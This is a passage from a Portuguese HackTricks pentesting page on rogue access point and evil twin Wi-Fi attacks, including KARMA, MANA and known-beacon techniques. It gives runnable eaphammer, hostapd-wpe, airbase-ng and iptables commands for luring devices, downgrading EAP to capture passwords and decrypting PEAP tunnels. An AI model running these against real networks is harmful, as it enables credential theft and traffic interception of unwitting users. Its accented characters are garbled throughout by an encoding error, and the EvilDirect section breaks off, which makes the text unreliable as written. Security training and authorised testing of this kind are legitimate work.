* As esta√ß√µes armazenam o ESSID de cada rede sem fio √† qual se conectam em sua Lista de Redes Preferidas (PNL), juntamente com detalhes de configura√ß√£o espec√≠ficos da rede.
* A PNL √© usada para conectar automaticamente a redes conhecidas, melhorando a experi√™ncia do usu√°rio ao simplificar o processo de conex√£o.

### Escaneamento Passivo

* Os APs transmitem periodicamente quadros de beacon, anunciando sua presen√ßa e caracter√≠sticas, incluindo o ESSID do AP, a menos que a transmiss√£o esteja desativada.
* Durante o escaneamento passivo, as esta√ß√µes escutam os quadros de beacon. Se o ESSID de um beacon corresponder a uma entrada na PNL da esta√ß√£o, a esta√ß√£o pode se conectar automaticamente a esse AP.
* O conhecimento da PNL de um dispositivo permite uma poss√≠vel explora√ß√£o ao imitar o ESSID de uma rede conhecida, enganando o dispositivo para se conectar a um AP malicioso.

### Probing Ativo

* O probing ativo envolve esta√ß√µes enviando solicita√ß√µes de probe para descobrir APs pr√≥ximos e suas caracter√≠sticas.
* Solicita√ß√µes de probe direcionadas visam um ESSID espec√≠fico, ajudando a detectar se uma rede particular est√° ao alcance, mesmo que seja uma rede oculta.
* Solicita√ß√µes de probe de broadcast t√™m um campo SSID nulo e s√£o enviadas a todos os APs pr√≥ximos, permitindo que a esta√ß√£o verifique qualquer rede preferida sem divulgar o conte√∫do de sua PNL.

## AP Simples com redirecionamento para a Internet

Antes de explicar como realizar ataques mais complexos, ser√° explicado **como** apenas **criar** um **AP** e **redirecionar** seu **tr√°fego** para uma interface conectada **√†** **Internet**.

Usando `ifconfig -a`, verifique se a interface wlan para criar o AP e a interface conectada √† Internet est√£o presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie o arquivo de configura√ß√£o `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ent√£o **defina IPs** e **rotas**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E ent√£o **inicie** o dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crie um arquivo de configura√ß√£o `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Pare processos irritantes**, configure **modo monitor** e **inicie o hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque de evil twin explora a maneira como os clientes WiFi reconhecem redes, dependendo principalmente do nome da rede (ESSID) sem exigir que a esta√ß√£o base (ponto de acesso) se autentique ao cliente. Os pontos principais incluem:

* **Dificuldade em Diferencia√ß√£o**: Dispositivos t√™m dificuldade em distinguir entre pontos de acesso leg√≠timos e maliciosos quando compartilham o mesmo ESSID e tipo de criptografia. Redes do mundo real frequentemente usam m√∫ltiplos pontos de acesso com o mesmo ESSID para estender a cobertura de forma cont√≠nua.
* **Roaming de Cliente e Manipula√ß√£o de Conex√£o**: O protocolo 802.11 permite que dispositivos se movam entre pontos de acesso dentro do mesmo ESS. Ataques podem explorar isso atraindo um dispositivo a desconectar de sua esta√ß√£o base atual e conectar-se a uma maliciosa. Isso pode ser alcan√ßado oferecendo um sinal mais forte ou interrompendo a conex√£o com o ponto de acesso leg√≠timo atrav√©s de m√©todos como pacotes de desautentica√ß√£o ou interfer√™ncia.
* **Desafios na Execu√ß√£o**: Executar com sucesso um ataque de evil twin em ambientes com m√∫ltiplos pontos de acesso bem posicionados pode ser desafiador. Desautenticar um √∫nico ponto de acesso leg√≠timo frequentemente resulta no dispositivo se conectando a outro ponto de acesso leg√≠timo, a menos que o atacante consiga desautenticar todos os pontos de acesso pr√≥ximos ou posicionar estrategicamente o ponto de acesso malicioso.

Voc√™ pode criar um Open Evil Twin muito b√°sico (sem capacidades de rotear tr√°fego para a Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Voc√™ tamb√©m pode criar um Evil Twin usando **eaphammer** (note que para criar evil twins com eaphammer a interface **N√ÉO DEVE** estar em modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando o Airgeddon: `Options: 5,6,7,8,9 (dentro do menu de ataque Evil Twin).`

![](<../../.gitbook/assets/image (1088).png>)

Por favor, note que por padr√£o, se um ESSID no PNL estiver salvo como protegido por WPA, o dispositivo n√£o se conectar√° automaticamente a um Evil Twin aberto. Voc√™ pode tentar DoS no AP real e esperar que o usu√°rio se conecte manualmente ao seu Evil Twin aberto, ou voc√™ pode DoS no AP real e usar um WPA Evil Twin para capturar o handshake (usando este m√©todo, voc√™ n√£o poder√° fazer a v√≠tima se conectar a voc√™, pois n√£o conhece o PSK, mas pode capturar o handshake e tentar quebr√°-lo).

_Alguns sistemas operacionais e antiv√≠rus avisar√£o o usu√°rio que se conectar a uma rede aberta √© perigoso..._

### WPA/WPA2 Evil Twin

Voc√™ pode criar um **Evil Twin usando WPA/2** e se os dispositivos estiverem configurados para se conectar a esse SSID com WPA/2, eles tentar√£o se conectar. De qualquer forma, **para completar o 4-way-handshake**, voc√™ tamb√©m precisa **saber** a **senha** que o cliente vai usar. Se voc√™ **n√£o souber**, a **conex√£o n√£o ser√° completada**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender esses ataques, eu recomendaria ler antes o breve [WPA Enterprise explanation](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um **arquivo de configura√ß√£o** para funcionar. Para **automatizar** a gera√ß√£o dessas configura√ß√µes, voc√™ pode usar [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (baixe o arquivo python dentro de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configura√ß√£o, voc√™ pode selecionar muitas coisas diferentes, como ssid, canal, arquivos de usu√°rio, cret/key, par√¢metros dh, vers√£o wpa e auth...

[**Usando hostapd-wpe com EAP-TLS para permitir que qualquer certificado fa√ßa login.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padr√£o, o EAPHammer prop√µe esses m√©todos de autentica√ß√£o (note que GTC √© o primeiro a ser tentado para obter senhas em texto simples e, em seguida, o uso de m√©todos de autentica√ß√£o mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta √© a metodologia padr√£o para evitar longos tempos de conex√£o. No entanto, voc√™ tamb√©m pode especificar ao servidor os m√©todos de autentica√ß√£o do mais fraco ao mais forte:
```
--negotiate weakest
```
Ou voc√™ tamb√©m pode usar:

* `--negotiate gtc-downgrade` para usar uma implementa√ß√£o de downgrade GTC altamente eficiente (senhas em texto claro)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente os m√©todos oferecidos (oferecer os mesmos m√©todos de autentica√ß√£o na mesma ordem que a organiza√ß√£o tornar√° o ataque muito mais dif√≠cil de detectar).
* [Encontre mais informa√ß√µes na wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` pode usar certificados gerados anteriormente para oferecer autentica√ß√£o EAP em redes WPA/WPA2-Enterprise. A rede falsa ir√° rebaixar o protocolo de conex√£o para EAP-MD5, de modo que ser√° capaz de **capturar o usu√°rio e o MD5 da senha**. Mais tarde, o atacante pode tentar quebrar a senha.\
`Airgeddon` oferece a possibilidade de um **ataque Evil Twin cont√≠nuo (barulhento)** ou **apenas criar o ataque Evil at√© que algu√©m se conecte (suave).**

![](<../../.gitbook/assets/image (936).png>)

### Depurando t√∫neis TLS PEAP e EAP-TTLS em ataques Evil Twins

_Este m√©todo foi testado em uma conex√£o PEAP, mas como estou descriptografando um t√∫nel TLS arbitr√°rio, isso tamb√©m deve funcionar com EAP-TTLS_

Dentro da **configura√ß√£o** do _hostapd-wpe_, **comente** a linha que cont√©m _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` para `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Isso far√° com que `hostapd-wpe` **troque chaves usando RSA** em vez de DH, para que voc√™ possa **descriptografar** o tr√°fego mais tarde **sabendo a chave privada do servidor**.

Agora inicie o **Evil Twin** usando **`hostapd-wpe`** com essa configura√ß√£o modificada como de costume. Al√©m disso, inicie **`wireshark`** na **interface** que est√° realizando o ataque Evil Twin.

Agora ou mais tarde (quando voc√™ j√° tiver capturado algumas tentativas de autentica√ß√£o) voc√™ pode adicionar a chave RSA privada ao wireshark em: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Adicione uma nova entrada e preencha o formul√°rio com estes valores: **Endere√ßo IP = qualquer** -- **Porta = 0** -- **Protocolo = data** -- **Arquivo de Chave** (**selecione seu arquivo de chave**, para evitar problemas, selecione um arquivo de chave **sem prote√ß√£o por senha**).

![](<../../.gitbook/assets/image (687).png>)

E olhe na nova **aba "Decrypted TLS"**:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Loud MANA e ataque de beacons conhecidos

### Listas negras/whitelists de ESSID e MAC

Diferentes tipos de Listas de Filtro de Controle de Acesso √† M√≠dia (MFACLs) e seus modos correspondentes e efeitos no comportamento de um Ponto de Acesso (AP) malicioso:

1. **Whitelist baseada em MAC**:
* O AP malicioso responder√° apenas a solicita√ß√µes de sondagem de dispositivos especificados na lista branca, permanecendo invis√≠vel a todos os outros n√£o listados.
2. **Blacklist baseada em MAC**:
* O AP malicioso ignorar√° solicita√ß√µes de sondagem de dispositivos na lista negra, tornando efetivamente o AP malicioso invis√≠vel para esses dispositivos espec√≠ficos.
3. **Whitelist baseada em SSID**:
* O AP malicioso responder√° a solicita√ß√µes de sondagem apenas para ESSIDs espec√≠ficos listados, tornando-o invis√≠vel para dispositivos cujas Listas de Redes Preferidas (PNLs) n√£o cont√™m esses ESSIDs.
4. **Blacklist baseada em SSID**:
* O AP malicioso n√£o responder√° a solicita√ß√µes de sondagem para os ESSIDs espec√≠ficos na lista negra, tornando-o invis√≠vel para dispositivos que buscam essas redes particulares.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este m√©todo permite que um **atacante crie um ponto de acesso (AP) malicioso que responde a todas as solicita√ß√µes de sondagem** de dispositivos que buscam se conectar a redes. Esta t√©cnica **enganha os dispositivos a se conectarem ao AP do atacante** ao imitar as redes que os dispositivos est√£o procurando. Uma vez que um dispositivo envia uma solicita√ß√£o de conex√£o a este AP malicioso, a conex√£o √© completada, levando o dispositivo a se conectar erroneamente √† rede do atacante.

### MANA

Ent√£o, **os dispositivos come√ßaram a ignorar respostas de rede n√£o solicitadas**, reduzindo a efic√°cia do ataque karma original. No entanto, um novo m√©todo, conhecido como **ataque MANA**, foi introduzido por Ian de Villiers e Dominic White. Este m√©todo envolve o AP malicioso **capturando as Listas de Redes Preferidas (PNL) dos dispositivos ao responder √†s suas solicita√ß√µes de sondagem de transmiss√£o** com nomes de rede (SSIDs) previamente solicitados pelos dispositivos. Este ataque sofisticado contorna as prote√ß√µes contra o ataque karma original explorando a maneira como os dispositivos lembram e priorizam redes conhecidas.

O ataque MANA opera monitorando tanto solicita√ß√µes de sondagem direcionadas quanto de transmiss√£o de dispositivos. Para solicita√ß√µes direcionadas, ele registra o endere√ßo MAC do dispositivo e o nome da rede solicitada, adicionando essas informa√ß√µes a uma lista. Quando uma solicita√ß√£o de transmiss√£o √© recebida, o AP responde com informa√ß√µes que correspondem a qualquer uma das redes na lista do dispositivo, atraindo o dispositivo a se conectar ao AP malicioso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Um **ataque Loud MANA** √© uma estrat√©gia avan√ßada para quando os dispositivos n√£o usam sondagem direcionada ou quando suas Listas de Redes Preferidas (PNL) s√£o desconhecidas para o atacante. Ele opera sob o princ√≠pio de que **dispositivos na mesma √°rea provavelmente compartilham alguns nomes de rede em suas PNLs**. Em vez de responder de forma seletiva, este ataque transmite respostas de sondagem para cada nome de rede (ESSID) encontrado nas PNLs combinadas de todos os dispositivos observados. Essa abordagem ampla aumenta a chance de um dispositivo reconhecer uma rede familiar e tentar se conectar ao Ponto de Acesso (AP) malicioso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando o **Loud MANA attack** pode n√£o ser suficiente, o **Known Beacon attack** apresenta outra abordagem. Este m√©todo **for√ßa o processo de conex√£o simulando um AP que responde a qualquer nome de rede, passando por uma lista de ESSIDs potenciais** derivada de uma lista de palavras. Isso simula a presen√ßa de in√∫meras redes, na esperan√ßa de corresponder a um ESSID dentro da PNL da v√≠tima, levando a uma tentativa de conex√£o ao AP fabricado. O ataque pode ser amplificado combinando-o com a op√ß√£o `--loud` para uma tentativa mais agressiva de capturar dispositivos.

Eaphammer implementou este ataque como um ataque MANA onde todos os ESSIDs dentro de uma lista s√£o carregados (voc√™ tamb√©m pode combinar isso com `--loud` para criar um ataque Loud MANA + Known beacons):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque de Beacon Burst Conhecido**

O **ataque de Beacon Burst Conhecido** envolve **a transmiss√£o r√°pida de quadros de beacon para cada ESSID listado em um arquivo**. Isso cria um ambiente denso de redes falsas, aumentando significativamente a probabilidade de dispositivos se conectarem ao AP malicioso, especialmente quando combinado com um ataque MANA. Essa t√©cnica aproveita a velocidade e o volume para sobrecarregar os mecanismos de sele√ß√£o de rede dos dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** √© um protocolo que permite que dispositivos se conectem diretamente entre si usando Wi-Fi, sem a necessidade de um ponto de acesso sem fio tradicional. Essa capacidade est√° integrada em v√°rios dispositivos da Internet das Coisas (IoT), como impressoras e televisores, facilitando a comunica√ß√£o direta entre dispositivos. Uma caracter√≠stica not√°vel do Wi-Fi Direct √© que um dispositivo assume o papel de ponto de acesso, conhecido como propriet√°rio do grupo, para gerenciar a conex√£o.

A seguran√ßa para conex√µes Wi-Fi Direct √© estabelecida atrav√©s do **Wi-Fi Protected Setup (WPS)**, que suporta v√°rios m√©todos para emparelhamento seguro, incluindo:

* **Push-Button Configuration (PBC)**
* **Entrada de PIN**
* **Comunica√ß√£o de Campo Pr√≥ximo (NFC)**

Esses m√©todos, particularmente a entrada de PIN, s√£o suscet√≠veis √†s mesmas vulnerabilidades que o WPS em redes Wi-Fi tradicionais, tornando-os alvos para vetores de ataque semelhantes.

### EvilDirect Hijacking

**EvilDirect Hijacking** √© um ataque espec√≠fico ao Wi-Fi Direct. Ele espelha o conceito de um ataque Evil Twin, mas visa conex√µes Wi-Fi Direct. Nesse cen√°rio, um atacante se faz passar por um propriet√°rio de grupo leg√≠timo com o objetivo de enganar dispositivos para se conectarem a uma entidade maliciosa. Esse m√©todo pode ser executado usando ferramentas como `airbase-ng`, especificando o canal, ESSID e endere√ßo MAC do dispositivo impersonado:

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: D√™ uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com facebook e imita√ß√£o de WPA em portals cativos)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas!

**Hacking Insights**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e nos desafios do hacking

**Real-Time Hack News**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado atrav√©s de not√≠cias e insights em tempo real

**Latest Announcements**\
Fique informado sobre as novas recompensas de bugs lan√ßadas e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos no** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
